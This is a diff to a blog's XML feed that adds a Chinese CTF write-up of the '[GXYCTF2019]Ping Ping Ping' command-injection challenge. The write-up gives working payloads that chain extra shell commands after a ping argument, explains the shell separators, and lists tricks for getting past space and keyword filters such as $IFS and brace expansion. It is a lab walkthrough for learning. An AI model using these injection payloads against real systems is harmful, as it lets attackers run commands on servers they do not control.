@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>BUU每日一题006</title>
+    <link href="/2021/01/20/BUU006/"/>
+    <url>/2021/01/20/BUU006/</url>
+    
+    <content type="html"><![CDATA[<h2 id="六、"><a href="#六、" class="headerlink" title="六、"></a>六、</h2><ul><li>题目：[GXYCTF2019]Ping Ping Ping<br><img src="https://ftp.bmp.ovh/imgs/2021/01/0e8930c04d1c8c22.png">   </li><li>分析<br>ls一下，得到可能含有flag的文件<br><img src="https://ftp.bmp.ovh/imgs/2021/01/9c0e86bdd2f60fbf.png"><br>ping的命令执行，经检验，空格和<code>flag</code>被过滤<br>空格可以用<code>$IFS</code>代替；flag可以用变量拼接绕过         </li><li>解     </li><li>*payload：**<code>/?ip=127.0.0.1;a=ag.php;b=fl;cat$IFS$b$a</code>得到flag<img src="https://ftp.bmp.ovh/imgs/2021/01/7d3e88cdfb0a1e8e.png"><br>另外<code>/?ip=127.0.0.1;cat$IFS`ls` </code>内联执行，反引号内的输出可以作为前面命令的输入，上面的<code>cat$IFS`ls```=</code> cat flag.php;cat index.php``得到：<img src="https://ftp.bmp.ovh/imgs/2021/01/404e14d9ad638b74.png">         </li><li>知识点<br>产生原因：      <blockquote><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些 执行系统命令的函数。如果用户可以控制命令执行函数中的参数时， 就可以注入一些恶意的系统命令到正常命令，造成命令执行漏洞          </p></blockquote></li></ul><p>几个符号     </p><blockquote><p><code>;</code><br>多条命令执行<br><code>|</code><br>管道符，上一条命令的输出，作为下一条命令参数。ctf里面：ping 127.0.0.1 | ls(只执行ls不执行前面的）本题<code>?ip=127.0.0.1|ls</code>只会输出<code>flag.php  index.php</code><br><code>&amp;</code><br><code>?ip=127.0.0.1&amp;ls</code>先执行ls后执行ping，但在题中试了下，输出的是ping的结果？？？？？？<br><code>&amp;&amp;</code><br><code>?ip=127.0.0.1&amp;&amp;ls</code>ping命令正确才执行ls<br><code>||</code><br>与&amp;&amp;相反，逻辑或的功能       </p></blockquote><p>一些绕过       </p><blockquote><p>空格     </p><blockquote><p>{cat,flag.php}<br>${IFS}<br>$IFS$9<br>$IFS$1<br><code>&lt;</code><br><code>&lt;&gt;</code><br>\x20 </p></blockquote></blockquote><blockquote><p>内联执行     </p><blockquote><p>``cat$IFS`ls```               </p></blockquote></blockquote><p><a href="https://www.cnblogs.com/Tkitn/p/11661017.html">MORE</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>wp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Level5</title>
     <link href="/2021/01/19/level5/"/>
     <url>/2021/01/19/level5/</url>
